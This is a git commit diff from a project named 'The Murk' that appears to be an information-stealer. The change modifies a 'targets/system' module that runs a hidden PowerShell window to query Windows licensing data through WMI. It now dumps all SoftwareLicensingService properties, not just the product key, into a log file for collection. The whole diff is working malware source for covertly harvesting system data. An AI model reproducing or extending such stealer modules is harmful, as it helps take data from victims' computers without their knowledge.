670a46acfbb0899ea74554fb6f89066cb66e668e
Nguyễn Cao Nguyên <nguyencaonguyen0944322545@gmail.com>
2024-06-27 12:17:51 +0700

    I'm bored, once again

--- The Murk/targets/system/productkey.py
+++ The Murk/targets/system/productkey.py
@@ -1,23 +1,29 @@
 from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, check_output
-from os import environ
+from os.path import join
 from manager.logger import Log
 from preferences.config import config
 
 def ProductKey():
-    pathToLogs = f'{config.pathToLogs}\\System\\productkey.txt'
+    pathToLogs = join(config.pathToLogs, "System", "productkey.txt")
     try:
         startupinfo = STARTUPINFO()
         startupinfo.dwFlags |= STARTF_USESHOWWINDOW
         result = check_output(
-            ['powershell', '-Command', '(Get-WmiObject -query \'select * from SoftwareLicensingService\').OA3xOriginalProductKey'],
+            ['powershell', '-Command', 'Get-WmiObject -query "select * from SoftwareLicensingService"'],
             text=True,
             startupinfo=startupinfo
-        )
-        output = result.strip()
+        ).strip().split("\n")
+
+        items = []
+        for item in result:
+            stripped = [elem.strip() for elem in item.split(":")]
+            items.append(": ".join(stripped))
+
+        if not items: raise Exception("Failed to query WMI")
+
+        with open(pathToLogs, "w", encoding="utf-8") as f:
+            f.write("\n".join(items))
+
     except Exception as e:
         Log(f"ProductKey ---> {e}")
         return
-
-    if output:
-        with open(pathToLogs, 'w', encoding='UTF-8') as f:
-            f.write(output)
